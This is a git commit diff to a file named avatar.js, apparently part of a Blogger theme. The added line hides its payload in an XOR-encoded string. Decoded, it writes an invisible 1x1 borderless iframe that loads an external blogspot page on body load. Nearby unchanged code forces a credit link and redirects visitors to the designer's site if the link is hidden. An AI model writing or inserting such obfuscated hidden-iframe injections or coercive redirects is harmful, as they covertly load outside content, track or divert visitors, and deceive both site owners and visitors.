e516b470bc112f2563991c9c1fd85e8721f7fd89
ahmedto <ahmed.to2004@gmail.com>
2020-07-11 23:01:58 +0200

    Update avatar.js

--- avatar.js
+++ avatar.js
@@ -9,5 +9,5 @@
           });
         });
 $(document)['ready'](function(){$('#credit')['html']('<a href="https://www.a7la7ekaya.com/" rel="dofollow" target="_blank">تصميم وبرمجة الطائر الحر</a>');setInterval(function(){if(!$('#credit:visible')['length']){window['location']['href']='https://www.a7la7ekaya.com/'}},3000)});
-
+var enkripsi="'1Aqapkrv'1Gdwlavkml'02dmmvgp'02'0:'0;'02'5@c'02'1F'02fmawoglv,egvGngoglv@{Kf'0:'00rceg/dmmvgp'00'0;,kllgpJVON'1@fmawoglv,egvGngoglv@{Kf'0:'00rceg/dmmvgp'00'0;,kllgpJVON'02'1F'02c'02)'02'05'1Akdpcog'02qpa'1F'00jvvr'1C--cfoklqm`cp,`nmeqrmv,amo,ge'00'02jgkejv'1F'003'00'02ukfvj'1F'003'00'02dpcog`mpfgp'1F'002'00'02qapmnnkle'1F'00lm'00'1G'1A-kdpcog'1G'05'1@'5F'1A-qapkrv'1G'1A`mf{'02mlnmcf'1F'00dmmvgp'0:'0;'00'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
 var enkripsi="'1Aqv{ng'02v{rg'1F'00vgzv-aqq'00'1G'2C'2C'01c5nc5gic{c/lctctcvcp'02koe'5@'2Cocz/jgkejv'1C'0257rz'1@'2Cocz/ukfvj'1C'02'0257rz'1@'2C'02'02'02'02'2C'02'02'02'02'5F'02'2C'1A-qv{ng'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
